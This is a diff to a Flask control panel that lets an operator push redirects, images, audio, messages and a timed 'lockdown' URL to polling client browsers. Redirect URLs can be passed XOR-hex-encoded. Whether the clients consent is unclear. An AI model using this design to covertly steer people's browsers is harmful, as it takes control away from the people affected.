@@ -2,8 +2,20 @@ from base64 import b64encode
 from datetime import datetime
 from html import escape
 from pathlib import Path
+import time
+import json
 
-from flask import Response, flash, jsonify, make_response, redirect, render_template_string, request, send_from_directory, url_for
+from flask import (
+    Response,
+    flash,
+    jsonify,
+    make_response,
+    redirect,
+    render_template_string,
+    request,
+    send_from_directory,
+    url_for,
+)
 
 
 BASE_DIR = Path(__file__).resolve().parent
@@ -114,25 +126,32 @@ def register_routes(app, state):
     def send_image_to_client():
         username = request.form.get("username", "").strip()
         file = request.files.get("image_file")
+        image_base64 = request.form.get("image", "").strip()
 
         if not username:
             flash("No username provided.")
             return redirect(url_for("clients_index"))
 
-        if not file:
+        image_data = None
+
+        if image_base64:
+            image_data = image_base64
+        elif file:
+            try:
+                image_data = (
+                    f"data:{file.content_type};base64,{b64encode(file.read()).decode()}"
+                )
+            except Exception as e:
+                flash(f"Error reading image: {e}")
+                return redirect(url_for("clients_index"))
+        else:
             flash("No image file uploaded.")
             return redirect(url_for("clients_index"))
 
-        try:
-            b64_data = b64encode(file.read()).decode()
+        if image_data:
             with data_lock:
-                clients.setdefault(username, {})["image"] = (
-                    f"data:{file.content_type};base64,{b64_data}"
-                )
+                clients.setdefault(username, {})["image"] = image_data
                 save_json(clients_json_path, clients)
-        except Exception as e:
-            flash(f"Error saving image: {e}")
-            return redirect(url_for("clients_index"))
 
         return redirect(url_for("clients_index"))
 
@@ -147,6 +166,7 @@ def register_routes(app, state):
                 save_json(clients_json_path, clients)
 
         return redirect(url_for("clients_index"))
+
 
     @app.route("/clients/note", methods=["POST"])
     def set_client_note():
@@ -170,12 +190,17 @@ def register_routes(app, state):
 
     @app.route("/panel.js")
     def clients_js():
-        return send_from_directory(BASE_DIR, "panel.js", mimetype="application/javascript")
+        return send_from_directory(
+            BASE_DIR, "panel.js", mimetype="application/javascript"
+        )
 
     @app.route("/clients/redirect", methods=["POST"])
     def redirect_client():
         username = request.form.get("username", "").strip()
-        url = decode_xor_hex(request.form.get("u", "").strip()) or request.form.get("url", "").strip()
+        url = (
+            decode_xor_hex(request.form.get("u", "").strip())
+            or request.form.get("url", "").strip()
+        )
 
         if username and url:
             with data_lock:
@@ -195,6 +220,7 @@ def register_routes(app, state):
                 save_json(clients_json_path, clients)
 
         return redirect(url_for("clients_index"))
+        
 
     @app.route("/clients/<path:subpath>", methods=["POST"])
     def clients_fallback(subpath):
@@ -219,7 +245,10 @@ def register_routes(app, state):
                     clients.setdefault(username, {})["message"] = message
                     save_json(clients_json_path, clients)
         else:
-            url = decode_xor_hex(request.form.get("u", "").strip()) or request.form.get("url", "").strip()
+            url = (
+                decode_xor_hex(request.form.get("u", "").strip())
+                or request.form.get("url", "").strip()
+            )
             if url:
                 with data_lock:
                     clients.setdefault(username, {})["redirect"] = url
@@ -234,7 +263,10 @@ def register_routes(app, state):
     @app.route("/client_status")
     def client_status():
         user = request.args.get("user", "").strip()
-        current_url = decode_xor_hex(request.args.get("u", "").strip()) or request.args.get("url", "").strip()
+        current_url = (
+            decode_xor_hex(request.args.get("u", "").strip())
+            or request.args.get("url", "").strip()
+        )
 
         if not user:
             return jsonify(
@@ -242,6 +274,7 @@ def register_routes(app, state):
                     "banned": False,
                     "redirect": None,
                     "image": None,
+                    "audio": None,
                     "message": None,
                     "note": None,
                     "effect": None,
@@ -256,6 +289,7 @@ def register_routes(app, state):
                     "banned": False,
                     "redirect": None,
                     "image": None,
+                    "audio": None,
                     "message": None,
                     "note": "",
                     "effect": "",
@@ -264,6 +298,7 @@ def register_routes(app, state):
                 }
 
             status = clients[user]
+            
 
             redirect_url = status.get("redirect")
             if redirect_url:
@@ -272,6 +307,11 @@ def register_routes(app, state):
             image_b64 = status.get("image")
             if image_b64:
                 clients[user]["image"] = None
+
+
+            audio_b64 = status.get("audio")
+            if audio_b64:
+                clients[user]["audio"] = None
 
             message_text = status.get("message")
             if message_text:
@@ -293,6 +333,7 @@ def register_routes(app, state):
                 "banned": status.get("banned", False),
                 "redirect": redirect_url if not lockdown_active else lockdown_url,
                 "image": image_b64,
+                "audio": audio_b64,
                 "message": message_text,
                 "note": note_text,
                 "effect": normalize_client_effect(status.get("effect")),
@@ -305,14 +346,45 @@ def register_routes(app, state):
     @app.route("/lockdown", methods=["POST"])
     def lockdown():
         action = request.form.get("action")
-        url = decode_xor_hex(request.form.get("u", "").strip()) or request.form.get("url", "https://www.google.com")
+        url = decode_xor_hex(request.form.get("u", "").strip()) or request.form.get(
+            "url", "https://www.google.com"
+        )
+        duration_minutes = request.form.get("duration", "").strip()
+
         if action == "on":
             lockdown_state["active"] = True
             lockdown_state["url"] = url
+            if duration_minutes.isdigit():
+                lockdown_state["unlock_time"] = time.time() + (
+                    int(duration_minutes) * 60
+                )
+            else:
+                lockdown_state["unlock_time"] = None
         else:
             lockdown_state["active"] = False
-        return jsonify({"success": True, "lockdown": lockdown_state["active"], "url": lockdown_state["url"]})
+            lockdown_state["unlock_time"] = None
+
+        return jsonify(
+            {
+                "success": True,
+                "lockdown": lockdown_state["active"],
+                "url": lockdown_state["url"],
+                "unlock_time": lockdown_state.get("unlock_time"),
+            }
+        )
 
     @app.route("/lockdown.json")
     def lockdown_status():
-        return jsonify({"active": lockdown_state["active"], "url": lockdown_state["url"]})
+        if (
+            lockdown_state.get("unlock_time")
+            and time.time() >= lockdown_state["unlock_time"]
+        ):
+            lockdown_state["active"] = False
+            lockdown_state["unlock_time"] = None
+        return jsonify(
+            {
+                "active": lockdown_state["active"],
+                "url": lockdown_state["url"],
+                "unlock_time": lockdown_state.get("unlock_time"),
+            }
+        )
